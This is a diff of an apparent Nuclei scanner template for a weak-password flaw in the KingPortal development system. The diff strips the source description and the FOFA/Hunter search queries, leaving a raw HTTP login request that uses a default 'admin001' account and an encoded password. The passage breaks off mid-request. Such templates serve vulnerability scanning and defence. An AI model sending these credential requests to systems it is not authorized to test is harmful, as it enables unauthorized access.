@@ -3,12 +3,8 @@ info:
   name: KingPortal开发系统 弱口令漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pt30vfdmqq9ipy65'
+  description: ''
   tags: default-login,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pt30vfdmqq9ipy65
-    fofa: 'Hunter: web.title="KingPortal"或fofa:title="KingPortal"'
 http:
 - raw:
   - 'GET /login?username=admin001&password=VHBD8afsBVQ5AZpEZiipxxQ6CoibfT%2BncF%2BUdvcbiNGvXmKrtdlyYlvUpAh0UzCm9MmhqFLQiWh3hRrliwE%2B9g%3D%3D%3F4vUqaZBD8quF6sl70YZY7ySlMm5SzG8zEAQf02pA704%3D&city=127.0.0.1+%E6%9C%AA%E7%9F%A5&_=1714986142803 HTTP/1.1
